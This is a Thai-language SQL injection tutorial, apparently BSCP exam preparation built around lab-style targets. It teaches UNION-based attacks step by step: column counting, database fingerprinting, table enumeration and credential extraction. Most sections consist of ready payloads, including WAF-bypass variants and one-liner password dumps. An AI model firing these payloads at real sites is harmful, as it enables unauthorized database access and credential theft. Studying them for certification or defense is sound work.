# UNION Attack — Extract Data จาก Database

> **Stage 2: Privilege Escalation** — ใช้ UNION เพื่อดึง credentials จาก database

---

## Table of Contents
1. [UNION คืออะไร](#union-คืออะไร)
2. [กฎของ UNION](#กฎของ-union-สำคัญมาก)
3. [UNION Attack 6 Steps](#union-attack--6-steps)
4. [Step 1: หาจำนวน Columns](#step-1-หาจำนวน-columns)
5. [Step 2: หา Columns ที่แสดงผล](#step-2-หา-columns-ที่แสดงผล)
6. [Step 3: ระบุ Database Type](#step-3-ระบุ-database-type)
7. [Step 4: List Tables](#step-4-list-tables)
8. [Step 5: List Columns](#step-5-list-columns)
9. [Step 6: Extract Data](#step-6-extract-data)
10. [Complete Attack Example](#complete-attack-example)
11. [Troubleshooting](#troubleshooting-common-issues)
12. [Cheat Sheet](#union-attack-cheat-sheet)

---

## UNION คืออะไร?

**UNION** = SQL operator ที่รวมผลลัพธ์จาก 2 queries เข้าด้วยกัน

```sql
SELECT username, password FROM users
UNION
SELECT table_name, null FROM information_schema.tables
```

**ผลลัพธ์:** ได้ทั้ง users data + table names ในผลลัพธ์เดียว

---

## ทำไมถึงใช้ UNION ใน SQLi?

```
┌─────────────────────────────────────────────────────────────┐
│  Original Query (ของเว็บ):                                   │
│  SELECT name, price FROM products WHERE category = 'Gifts'  │
│                                                             │
│  เราเห็นแค่: ชื่อสินค้า + ราคา                                 │
├─────────────────────────────────────────────────────────────┤
│  Injected Query (UNION Attack):                             │
│  SELECT name, price FROM products WHERE category = 'Gifts'  │
│  UNION                                                      │
│  SELECT username, password FROM users                       │
│                                                             │
│  ตอนนี้เราเห็น: ชื่อสินค้า + ราคา + username + password!      │
└─────────────────────────────────────────────────────────────┘
```

---

## กฎของ UNION (สำคัญมาก!)

### กฎ 1: จำนวน Columns ต้องเท่ากัน

```sql
-- ✓ ถูก: ทั้งสอง query มี 2 columns
SELECT username, password FROM users
UNION
SELECT name, price FROM products

-- ✗ ผิด: column ไม่เท่ากัน
SELECT username, password, email FROM users    -- 3 columns
UNION
SELECT name, price FROM products               -- 2 columns
```

**Error ถ้าผิด:**
```
MySQL:      The used SELECT statements have a different number of columns
PostgreSQL: each UNION query must have the same number of columns
MSSQL:      All queries combined using UNION must have the same number of expressions
```

### กฎ 2: Data Type ต้อง Compatible

```sql
-- ✓ ถูก: string กับ string
SELECT username FROM users
UNION
SELECT table_name FROM information_schema.tables

-- อาจมีปัญหา: string กับ integer
SELECT username FROM users      -- string
UNION
SELECT price FROM products      -- integer (บาง DB convert ให้อัตโนมัติ)
```

**Tip:** ใช้ `NULL` เพื่อหลีกเลี่ยงปัญหา data type

---

## UNION Attack — 6 Steps

```
Step 1: หาจำนวน Columns
        ↓
Step 2: หา Columns ที่แสดงผล (String-compatible)
        ↓
Step 3: ระบุ Database Type
        ↓
Step 4: List Tables
        ↓
Step 5: List Columns
        ↓
Step 6: Extract Data (credentials)
```

---

## Step 1: หาจำนวน Columns

### วิธี A: ORDER BY

**หลักการ:** `ORDER BY n` จะ error ถ้า n > จำนวน columns

```
' ORDER BY 1--    → OK
' ORDER BY 2--    → OK
' ORDER BY 3--    → OK
' ORDER BY 4--    → Error!
```
**= มี 3 columns**

**URL Example:**
```
https://shop.com/products?category=Gifts' ORDER BY 1--
https://shop.com/products?category=Gifts' ORDER BY 2--
https://shop.com/products?category=Gifts' ORDER BY 3--
https://shop.com/products?category=Gifts' ORDER BY 4--    ← Error
```

**Error Message:**
```
MySQL:      Unknown column '4' in 'order clause'
PostgreSQL: ORDER BY position 4 is not in select list
```

### วิธี B: UNION SELECT NULL

**หลักการ:** เพิ่ม NULL ไปเรื่อยๆ จนไม่ error

```
' UNION SELECT NULL--                    → Error
' UNION SELECT NULL,NULL--               → Error
' UNION SELECT NULL,NULL,NULL--          → OK!
```
**= มี 3 columns**

**URL Example:**
```
https://shop.com/products?category=Gifts' UNION SELECT NULL--
https://shop.com/products?category=Gifts' UNION SELECT NULL,NULL--
https://shop.com/products?category=Gifts' UNION SELECT NULL,NULL,NULL--    ← OK
```

### เปรียบเทียบ 2 วิธี

| วิธี | ข้อดี | ข้อเสีย |
|-----|------|--------|
| ORDER BY | เร็ว, ใช้ binary search ได้ | บาง DB ไม่ support ORDER BY number |
| UNION SELECT NULL | ทำงานได้ทุก DB | ช้ากว่าถ้ามีหลาย columns |

### Binary Search สำหรับ ORDER BY

ถ้ามีหลาย columns (เช่น 20+):

```
ORDER BY 10--   → OK     (มี >= 10)
ORDER BY 15--   → Error  (มี < 15)
ORDER BY 12--   → OK     (มี >= 12)
ORDER BY 13--   → OK     (มี >= 13)
ORDER BY 14--   → Error  (มี < 14)
= มี 13 columns
```

---

## Step 2: หา Columns ที่แสดงผล

**ปัญหา:** ไม่ใช่ทุก column จะแสดงบนหน้าเว็บ

```sql
-- Query อาจ SELECT 5 columns แต่แสดงแค่ 2 columns
SELECT id, name, description, price, stock FROM products
        ↑    ↑        ↑          ↑      ↑
       ไม่  แสดง     ไม่        แสดง    ไม่
      แสดง          แสดง               แสดง
```

### วิธีหา: ใส่ค่าที่มองเห็นได้

```sql
' UNION SELECT 'a',NULL,NULL--      → ดูว่า 'a' แสดงไหม
' UNION SELECT NULL,'a',NULL--      → ดูว่า 'a' แสดงไหม
' UNION SELECT NULL,NULL,'a'--      → ดูว่า 'a' แสดงไหม
```

**ถ้า column 2 แสดง 'a':**
```html
<!-- หน้าเว็บแสดง -->
<div class="product">
    <h3>a</h3>           ← เห็น 'a' ตรงนี้!
    <p>Price: NULL</p>
</div>
```

### ใช้ตัวเลขแทนก็ได้

```sql
' UNION SELECT 1,2,3--
' UNION SELECT 11,22,33--
' UNION SELECT 111,222,333--
```

**ดูว่าเลขไหนแสดง** → column นั้นใช้ extract data ได้

### ถ้าทุก Column เป็น Integer

บาง column รับแค่ integer:

```sql
' UNION SELECT 'a',NULL,NULL--   → Error (column 1 ต้องเป็น int)
' UNION SELECT NULL,'a',NULL--   → OK! (column 2 รับ string)
' UNION SELECT NULL,NULL,'a'--   → Error (column 3 ต้องเป็น int)
```

**= ใช้ column 2 ในการ extract data**

---

## Step 3: ระบุ Database Type

**ทำไมต้องรู้?** แต่ละ DB มี syntax ต่างกัน

### Version Query

```sql
-- MySQL
' UNION SELECT NULL,@@version,NULL--
' UNION SELECT NULL,version(),NULL--

-- PostgreSQL
' UNION SELECT NULL,version(),NULL--

-- MSSQL
' UNION SELECT NULL,@@version,NULL--

-- Oracle (ต้องมี FROM)
' UNION SELECT NULL,banner,NULL FROM v$version--
' UNION SELECT NULL,NULL,NULL FROM dual--

-- SQLite
' UNION SELECT NULL,sqlite_version(),NULL--
```

### ผลลัพธ์ตัวอย่าง

```
MySQL:      5.7.32-0ubuntu0.18.04.1
PostgreSQL: PostgreSQL 12.4 on x86_64-pc-linux-gnu
MSSQL:      Microsoft SQL Server 2019 (RTM)
Oracle:     Oracle Database 19c Enterprise Edition
SQLite:     3.31.1
```

---

## Step 4: List Tables

### MySQL / PostgreSQL / MSSQL

```sql
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--

-- Filter เฉพาะ user tables (ไม่เอา system tables)
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='public'--        -- PostgreSQL
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--      -- MySQL
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_type='BASE TABLE'--
```

### Oracle

```sql
' UNION SELECT NULL,table_name,NULL FROM all_tables--
' UNION SELECT NULL,table_name,NULL FROM user_tables--
```

### SQLite

```sql
' UNION SELECT NULL,name,NULL FROM sqlite_master WHERE type='table'--
```

### ผลลัพธ์ที่น่าสนใจ

```
users              ← น่าสนใจ! (credentials)
accounts           ← น่าสนใจ!
customers          ← น่าสนใจ!
admin              ← น่าสนใจ!
products           ← ปกติ
orders             ← ปกติ
sessions           ← อาจมี session tokens
```

---

## Step 5: List Columns

**เมื่อรู้ว่า table ชื่อ `users`:**

### MySQL / PostgreSQL / MSSQL

```sql
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

### Oracle

```sql
' UNION SELECT NULL,column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
```

### SQLite

```sql
' UNION SELECT NULL,sql,NULL FROM sqlite_master WHERE type='table' AND name='users'--
```

### ผลลัพธ์ที่ได้

```
id
username           ← ต้องการ!
password           ← ต้องการ!
email
role
created_at
```

---

## Step 6: Extract Data

**รู้แล้วว่า:** table `users` มี columns `username` และ `password`

### ถ้ามี 2+ Columns ที่แสดงผล

```sql
' UNION SELECT NULL,username,password FROM users--
```

**ผลลัพธ์:**
```
admin       | s3cr3t_p@ssw0rd
carlos      | montoya123
wiener      | peter
```

### ถ้ามีแค่ 1 Column ที่แสดงผล

ต้อง **concatenate** หลาย columns เข้าด้วยกัน:

```sql
-- PostgreSQL / Oracle
' UNION SELECT NULL,username||'~'||password,NULL FROM users--

-- MySQL
' UNION SELECT NULL,CONCAT(username,'~',password),NULL FROM users--

-- MSSQL
' UNION SELECT NULL,username+'~'+password,NULL FROM users--
```

**ผลลัพธ์:**
```
admin~s3cr3t_p@ssw0rd
carlos~montoya123
wiener~peter
```

### Separator ที่นิยมใช้

| Separator | ตัวอย่าง | หมายเหตุ |
|-----------|---------|---------|
| `~` | `admin~password` | ไม่ค่อยอยู่ใน data |
| `:` | `admin:password` | passwd file format |
| `\|` | `admin\|password` | ต้อง escape ใน URL |
| `---` | `admin---password` | เห็นชัด |

---

## Complete Attack Example

### Target URL:
```
https://shop.com/products?category=Gifts
```

### Step 1: Find Columns
```
?category=Gifts' ORDER BY 1--     ✓
?category=Gifts' ORDER BY 2--     ✓
?category=Gifts' ORDER BY 3--     ✗ Error
= 2 columns
```

### Step 2: Find Display Column
```
?category=Gifts' UNION SELECT 'test1','test2'--
```
**หน้าเว็บแสดง:** `test1` ใน product name, `test2` ใน description
**= ใช้ได้ทั้ง 2 columns**

### Step 3: Database Version
```
?category=Gifts' UNION SELECT NULL,version()--
```
**Result:** `PostgreSQL 12.4`

### Step 4: List Tables
```
?category=Gifts' UNION SELECT NULL,table_name FROM information_schema.tables--
```
**Result:** `users`, `products`, `orders`...

### Step 5: List Columns
```
?category=Gifts' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--
```
**Result:** `id`, `username`, `password`, `email`

### Step 6: Extract Credentials
```
?category=Gifts' UNION SELECT username,password FROM users--
```
**Result:**
```
administrator | f8k2j4h8s9d7f6g5
carlos        | qwerty123
wiener        | peter
```

### Victory!
Login as `administrator` : `f8k2j4h8s9d7f6g5`

---

## Troubleshooting: Common Issues

### Issue 1: UNION ไม่ทำงาน

**อาการ:** Payload ไม่ error แต่ไม่เห็นข้อมูลเพิ่ม

**สาเหตุ:** Original query return หลาย rows, UNION row อยู่ด้านล่าง

**แก้ไข:** ทำให้ original query return 0 rows
```sql
' AND 1=2 UNION SELECT NULL,username,password FROM users--
  ↑
  1=2 = false = original query ไม่ return อะไร
```

หรือใส่ category ที่ไม่มี:
```
?category=NOTEXIST' UNION SELECT NULL,username,password FROM users--
```

---

### Issue 2: ไม่เห็น Output เลย

**อาการ:** Query ทำงาน แต่ไม่แสดงบนหน้าเว็บ

**สาเหตุ:** Data ถูก filter หรือ encode

**แก้ไข:** ลอง encode output
```sql
' UNION SELECT NULL,TO_BASE64(password),NULL FROM users--   -- MySQL
' UNION SELECT NULL,encode(password::bytea,'base64'),NULL FROM users--  -- PostgreSQL
```

---

### Issue 3: WAF Blocks UNION

**อาการ:** Request ถูก block เมื่อใส่ `UNION`

**แก้ไข:** Bypass techniques
```sql
' UnIoN SeLeCt NULL,NULL--              -- Mixed case
' UNION/**/SELECT NULL,NULL--           -- Comment bypass
' UNION%0ASELECT NULL,NULL--            -- Newline bypass
' /*!50000UNION*/ SELECT NULL,NULL--    -- MySQL version comment
```

---

### Issue 4: String ต้องใส่ Quote

**อาการ:** Error เมื่อใส่ string ใน WHERE

**สาเหตุ:** ต้อง escape quotes

**แก้ไข:** ใช้ hex หรือ char
```sql
-- แทนที่ WHERE table_name='users'
WHERE table_name=0x7573657273                        -- MySQL hex
WHERE table_name=CHR(117)||CHR(115)||CHR(101)||CHR(114)||CHR(115)  -- Oracle
```

---

## Oracle Special Case

**Oracle ต้องมี FROM clause เสมอ:**

```sql
-- ผิด
' UNION SELECT NULL,NULL--

-- ถูก
' UNION SELECT NULL,NULL FROM dual--
```

**`dual`** = dummy table ใน Oracle

---

## UNION Attack Cheat Sheet

### Quick Reference

| Step | MySQL | PostgreSQL | Oracle |
|------|-------|------------|--------|
| Version | `@@version` | `version()` | `SELECT banner FROM v$version` |
| Tables | `information_schema.tables` | `information_schema.tables` | `all_tables` |
| Columns | `information_schema.columns` | `information_schema.columns` | `all_tab_columns` |
| Concat | `CONCAT(a,b)` | `a\|\|b` | `a\|\|b` |
| Dummy table | ไม่ต้อง | ไม่ต้อง | `FROM dual` |
| Comment | `-- ` หรือ `#` | `--` | `--` |

### One-liner Payloads

```sql
-- MySQL: Get all users in one row
' UNION SELECT NULL,GROUP_CONCAT(username,':',password) FROM users--

-- PostgreSQL: Get all users
' UNION SELECT NULL,string_agg(username||':'||password,',') FROM users--
```

### URL Encoding (เมื่อ inject ผ่าน URL)

| Character | URL Encoded |
|-----------|-------------|
| Space | `%20` หรือ `+` |
| `'` | `%27` |
| `#` | `%23` |
| `=` | `%3D` |
| `+` | `%2B` |
| `--` | `--%20` หรือ `--+` |

---

## BSCP Exam Tips

| Situation | Action |
|-----------|--------|
| Product category filter | UNION attack ทันที |
| Search function | อาจต้อง URL encode |
| เห็น 1 column | ใช้ CONCAT |
| Oracle database | อย่าลืม `FROM dual` |
| ไม่เห็น output | ใช้ `AND 1=2` ก่อน UNION |
| หลาย rows | ใช้ GROUP_CONCAT หรือ string_agg |
| WAF blocking | ลอง case variation, comments |

---

## Next Steps

- [04-Blind-SQLi.md](./04-Blind-SQLi.md) — Boolean & Time-based blind injection
- [05-SQLmap-Usage.md](./05-SQLmap-Usage.md) — Automation with SQLmap
